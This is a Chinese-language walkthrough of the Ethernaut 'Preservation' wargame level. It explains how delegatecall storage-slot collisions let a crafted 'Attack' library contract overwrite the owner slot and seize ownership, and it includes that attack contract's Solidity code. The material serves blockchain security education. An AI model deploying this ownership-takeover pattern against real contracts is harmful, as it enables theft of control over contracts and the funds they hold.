# Preservation

## Reference
[Preservation](https://ethernaut.openzeppelin.com/level/16)

[Preservation.sol](https://github.com/yuhuajing/ethernaut-book/blob/main/src/16-Preservation/Preservation.sol)

## 目标
1. 合约提供两个不同时区时间，通过自定义的时区示例合约，成功抢占当前合约的 `Owner`

## 分析
1. 和 [telephone](https://github.com/yuhuajing/ethernaut-book/blob/main/src/04-Telephone/Telephone.md)类似
2. 当前合约 `delegateCall` 远程合约，使用远程合约的逻辑更新当前合约内部的参数
3. 当前合约内部更新自己内部参数时，按照远程 `delegateCall` 的合约 `slot` 栈顺序进行更新
### Owner
```solidity
contract Preservation {
    // public library contracts
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;
```
1. `address` 数据类型占据完整的 `slot`,`Preservation` 合约中在 `slot2` 中存储 `owner`
2. 因此，`Preservation` 合约执行 `delegatecall` 更新自身参数的时候，实例合约应该更新 `slot2` 数据
```solidity
// Simple library contract to set the time
contract Attack {
    address public t1;
    address public t2;
    address public owner;
     uint256 storedTime;

    function setTime(uint256 _time) public {
        owner = msg.sender;
        storedTime = _time;
    }
}
```
3. `Preservation` 合约将 `Attack` 合约作为 `instance` 实例，直接 `delegateCall setTime(uint256 _time)` 函数
4. `Attack` 合约更新 `slot2,slot3` 数据
5. 因此，`Preservation` 将 `slot2` 值按照 `Attack` 合约逻辑更新为 `msg.sender`, 将 `slot3` 的值更新为内部传输的参数 `_time`.
